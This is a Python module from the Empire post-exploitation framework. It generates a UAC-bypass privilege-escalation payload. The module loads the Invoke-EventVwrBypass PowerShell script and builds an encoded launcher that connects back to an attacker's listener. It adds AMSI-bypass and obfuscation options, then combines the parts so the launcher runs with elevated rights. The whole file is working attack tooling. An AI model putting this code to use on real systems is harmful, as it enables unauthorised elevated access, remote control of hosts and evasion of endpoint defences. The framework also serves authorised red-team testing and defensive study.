from __future__ import print_function
from builtins import str
from builtins import object
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # Set booleans to false by default
        Obfuscate = False
        AMSIBypass = False
        AMSIBypass2 = False

        listenerName = params['Listener']

        # staging options
        userAgent = params['UserAgent']
        
        proxy = params['Proxy']
        proxyCreds = params['ProxyCreds']
        if (params['Obfuscate']).lower() == 'true':
            Obfuscate = True
        ObfuscateCommand = params['ObfuscateCommand']
        if (params['AMSIBypass']).lower() == 'true':
            AMSIBypass = True
        if (params['AMSIBypass2']).lower() == 'true':
            AMSIBypass2 = True

        # read in the common module source code
        moduleSource = main_menu.installPath + "/data/module_source/privesc/Invoke-EventVwrBypass.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscation_command)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        if not main_menu.listeners.is_listener_valid(listenerName):
            # not a valid listener, return nothing for the script
            print(helpers.color("[!] Invalid listener: " + listenerName))
            return ""
        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(listenerName, language='powershell', encode=True,
                                                               obfuscate=Obfuscate,
                                                               obfuscationCommand=ObfuscateCommand, userAgent=userAgent,
                                                               proxy=proxy,
                                                               proxyCreds=proxyCreds, AMSIBypass=AMSIBypass,
                                                               AMSIBypass2=AMSIBypass2)

            encScript = launcher.split(" ")[-1]
            if launcher == "":
                print(helpers.color("[!] Error in launcher generation."))
                return ""
            else:
                scriptEnd = "Invoke-EventVwrBypass -Command \"%s\"" % (encScript)

        if obfuscate:
            scriptEnd = helpers.obfuscate(main_menu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscation_command)
        script += scriptEnd
        script = helpers.keyword_obfuscation(script)

        return script

